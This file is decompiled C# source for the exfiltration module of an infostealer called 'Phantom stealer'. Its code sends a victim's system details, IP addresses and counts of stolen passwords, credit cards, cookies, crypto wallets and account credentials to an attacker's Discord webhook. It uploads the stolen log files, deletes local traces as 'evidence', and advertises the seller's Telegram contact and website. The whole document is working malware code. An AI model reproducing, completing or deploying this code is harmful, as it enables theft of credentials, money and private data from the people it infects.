using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000030 RID: 48
	internal sealed class DiscordSendLogs
	{
		// Token: 0x060000E6 RID: 230 RVA: 0x0000B8C0 File Offset: 0x00009AC0
		private static int GetMessageId(string responseBody)
		{
			return 0;
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000B8D0 File Offset: 0x00009AD0
		[return: TupleElementNames(new string[] { "IsSuccess", "MessageId" })]
		public static async Task<ValueTuple<bool, int>> SendMessageAsync(string text)
		{
			try
			{
				Dictionary<string, string> discordValues = new Dictionary<string, string>
				{
					{ "username", "Phantom stealer" },
					{ "avatar_url", "https://www.phantomsoftwares.site/logo/phantom_discord.png" },
					{ "content", text }
				};
				using (HttpClient client = new HttpClient())
				{
					FormUrlEncodedContent content = new FormUrlEncodedContent(discordValues);
					ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter = client.PostAsync(DiscordSendLogs.DiscordToken + "?wait=true", content).ConfigureAwait(false).GetAwaiter();
					if (!configuredTaskAwaiter.IsCompleted)
					{
						await configuredTaskAwaiter;
						ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
						configuredTaskAwaiter = configuredTaskAwaiter2;
						configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<HttpResponseMessage>.ConfiguredTaskAwaiter);
					}
					HttpResponseMessage httpResponseMessage = configuredTaskAwaiter.GetResult();
					HttpResponseMessage response = httpResponseMessage;
					httpResponseMessage = null;
					if (response.IsSuccessStatusCode)
					{
						TaskAwaiter<string> taskAwaiter = response.Content.ReadAsStringAsync().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter<string> taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter<string>);
						}
						string text2 = taskAwaiter.GetResult();
						string responseBody = text2;
						text2 = null;
						int messageId = DiscordSendLogs.GetMessageId(responseBody);
						return new ValueTuple<bool, int>(true, messageId);
					}
					content = null;
					response = null;
				}
				HttpClient client = null;
				discordValues = null;
			}
			catch (Exception error)
			{
				string text3 = "Discord >> SendMessage exception:\n";
				Exception ex = error;
				Console.WriteLine(text3 + ((ex != null) ? ex.ToString() : null));
			}
			return new ValueTuple<bool, int>(false, 0);
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000B914 File Offset: 0x00009B14
		public static async Task SendMessageInfoAsync()
		{
			string text = Config.Version;
			string text2 = SystemInfo.GetSystemVersion();
			string text3 = SystemInfo.Username;
			string text4 = SystemInfo.Compname;
			string text5 = Flags.GetFlag(SystemInfo.Culture.Split(new char[] { '-' })[1]);
			string text6 = SystemInfo.Culture;
			string text7 = SystemInfo.GetAntivirus();
			string text8 = SystemInfo.GetDefaultGateway();
			string text9 = SystemInfo.GetLocalIp();
			TaskAwaiter<string> taskAwaiter = SystemInfo.GetPublicIpAsync().GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<string> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<string>);
			}
			string text10 = taskAwaiter.GetResult();
			string info = string.Concat(new string[]
			{
				"```\n\ud83d\ude39 *Phantom stealer ",
				text,
				" - Report:*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83d\udcc5 Date: ",
				SystemInfo.Datenow,
				"\n\ud83d\udda5\ufe0f System: ",
				text2,
				"\n\ud83d\udc64 Username: ",
				text3,
				"\n\ud83d\udcbb CompName: ",
				text4,
				"\n\ud83c\udf10 Language: ",
				text5,
				" ",
				text6,
				"\n\ud83d\udee1\ufe0f Antivirus: ",
				text7,
				"\n\n*NETWORK INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83c\udf10 Gateway IP: ",
				text8,
				"\n\ud83d\udd12 Internal IP: ",
				text9,
				"\n\ud83c\udf0d External IP: ",
				text10,
				"\n\n*BROWSER RECOVERIES*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords),
				Counter.GetIValue("\ud83d\udcb3 Credit Cards", Counter.CreditCards),
				Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				"\n\n*SOFTWARE & ACCOUNTS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udd0c FTP Hosts", Counter.FtpHosts),
				Counter.GetIValue("\ud83d\udd12 VPN Accounts", Counter.Vpn),
				Counter.GetSValue("\ud83d\udce7 Outlook", Counter.Outlook),
				Counter.GetSValue("\ud83d\udce7 FoxMail", Counter.FoxMail),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				Counter.GetSValue("\ud83d\udc7e Discord", Counter.Discord),
				Counter.GetSValue("\ud83d\udcac WinScp", Counter.WinScp),
				"\n\n*Grabbed Files*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb3 Images", Counter.GrabberImages),
				Counter.GetIValue("\ud83d\udcac Documents", Counter.GrabberDocuments),
				Counter.GetIValue("\ud83d\udda5\ufe0f Databases", Counter.GrabberDatabases),
				Counter.GetIValue("\ud83d\udd0c SourceCodes", Counter.GrabberSourceCodes),
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				"\n\n*DEVICE INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udce1 WiFi Networks", Counter.SavedWifiNetworks),
				"\n\n*INSTALLATION STATUS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetBValue(Config.Startup == "1", "✅ Startup: Enabled", "⛔ Startup: Disabled"),
				Counter.GetBValue(Config.Debug == "1", "✅ Debug Mode: Enabled", "⛔ Debug Mode: Disabled"),
				Counter.GetBValue(Config.AntiAnalysis == "1", "✅ AntiAnalysis: Enabled", "⛔ AntiAnalysis: Disabled"),
				Counter.GetBValue(Config.Keylogger == "1", "✅ Keylogger: Enabled", "⛔ Keylogger: Disabled"),
				Counter.GetBValue(Config.Screenshot == "1", "✅ Screenshot: Enabled", "⛔ Screenshot: Disabled"),
				Counter.GetBValue(Config.ClipperCheckBox == "1", "✅ CryptoClipper: Enabled", "⛔ CryptoClipper: Disabled"),
				Counter.GetBValue(Config.FileGrabberCheckBox == "1", "✅ FileGrabber: Enabled", "⛔ FileGrabber: Disabled"),
				"\n\n Telegram contact https://t.me/Oldphantomoftheopera\n\n website https://www.phantomsoftwares.site/home```"
			});
			text = null;
			text2 = null;
			text3 = null;
			text4 = null;
			text5 = null;
			text6 = null;
			text7 = null;
			text8 = null;
			text9 = null;
			text10 = null;
			TaskAwaiter<ValueTuple<bool, int>> taskAwaiter3 = DiscordSendLogs.SendMessageAsync(info).GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				TaskAwaiter<ValueTuple<bool, int>> taskAwaiter4;
				taskAwaiter3 = taskAwaiter4;
				taskAwaiter4 = default(TaskAwaiter<ValueTuple<bool, int>>);
			}
			taskAwaiter3.GetResult();
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000B954 File Offset: 0x00009B54
		public static async Task SendReportAsync(string file = null)
		{
			Console.WriteLine("Uploading logs to Discord");
			TaskAwaiter<List<string>> taskAwaiter = UploadToDiscord.UploadFilesAsync().GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<List<string>> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<List<string>>);
			}
			List<string> list = taskAwaiter.GetResult();
			List<string> uploadResponses = list;
			list = null;
			foreach (string response in uploadResponses)
			{
				Console.WriteLine(response);
				response = null;
			}
			List<string>.Enumerator enumerator = default(List<string>.Enumerator);
			string workDir = Paths.InitWorkDir();
			string[] filesToDelete = (from f in Directory.GetFiles(workDir)
				where new string[] { ".txt", ".png", ".json" }.Contains(Path.GetExtension(f).ToLower())
				select f).ToArray<string>();
			foreach (string fileToDelete in filesToDelete)
			{
				try
				{
					Console.WriteLine("Upload Complete, deleting any evidence");
					File.Delete(fileToDelete);
					Console.WriteLine("Deleted: " + fileToDelete);
				}
				catch (Exception ex)
				{
					Console.WriteLine("Failed to delete " + fileToDelete + ": " + ex.Message);
				}
				fileToDelete = null;
			}
			string[] array = null;
			Logging.Log("Sending Log summary to Discord", true);
			TaskAwaiter taskAwaiter3 = DiscordSendLogs.SendMessageInfoAsync().GetAwaiter();
			if (!taskAwaiter3.IsCompleted)
			{
				await taskAwaiter3;
				TaskAwaiter taskAwaiter4;
				taskAwaiter3 = taskAwaiter4;
				taskAwaiter4 = default(TaskAwaiter);
			}
			taskAwaiter3.GetResult();
			Logging.Log("Summary Successfully Sent", true);
		}

		// Token: 0x060000EA RID: 234 RVA: 0x000038B4 File Offset: 0x00001AB4
		public DiscordSendLogs()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x060000EB RID: 235 RVA: 0x00003C6E File Offset: 0x00001E6E
		static DiscordSendLogs()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			DiscordSendLogs.DiscordToken = Config.DiscordWebhook;
		}

		// Token: 0x040000F2 RID: 242
		private static string DiscordToken;
	}
}
